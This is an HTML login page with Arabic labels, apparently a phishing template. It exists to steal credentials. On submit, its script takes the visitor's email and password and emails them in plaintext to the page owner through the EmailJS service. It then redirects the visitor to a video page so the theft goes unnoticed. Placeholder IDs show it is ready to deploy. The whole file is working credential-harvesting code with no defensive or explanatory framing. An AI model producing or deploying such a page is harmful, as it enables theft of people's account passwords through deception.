<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول</title>
    <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
</head>
<body>
    <h2>تسجيل الدخول</h2>
    <form id="loginForm">
        <label for="email">البريد الإلكتروني:</label>
        <input type="email" id="email" name="email" required /><br><br>

        <label for="password">كلمة المرور:</label>
        <input type="password" id="password" name="password" required /><br><br>

        <button type="submit">تسجيل الدخول</button>
    </form>

    <script>
        // تهيئة EmailJS
        emailjs.init("YOUR_USER_ID"); // استبدل بـ "User ID" الخاص بك من EmailJS

        // إضافة حدث عند إرسال النموذج
        document.getElementById("loginForm").addEventListener("submit", function(event) {
            event.preventDefault();

            // الحصول على البيانات المدخلة
            let email = document.getElementById("email").value;
            let password = document.getElementById("password").value;

            // إرسال البيانات إلى بريدك باستخدام EmailJS
            emailjs.send("YOUR_SERVICE_ID", "YOUR_TEMPLATE_ID", {
                email: email,
                password: password
            }).then(function(response) {
                console.log("تم إرسال البريد بنجاح: ", response);
                window.location.href = "video.html"; // توجيه المستخدم بعد إرسال البيانات
            }, function(error) {
                console.error("فشل إرسال البريد: ", error);
                alert("حدث خطأ أثناء إرسال البيانات: " + error.text); // عرض تفاصيل الخطأ
            });
        });
    </script>
</body>
</html>
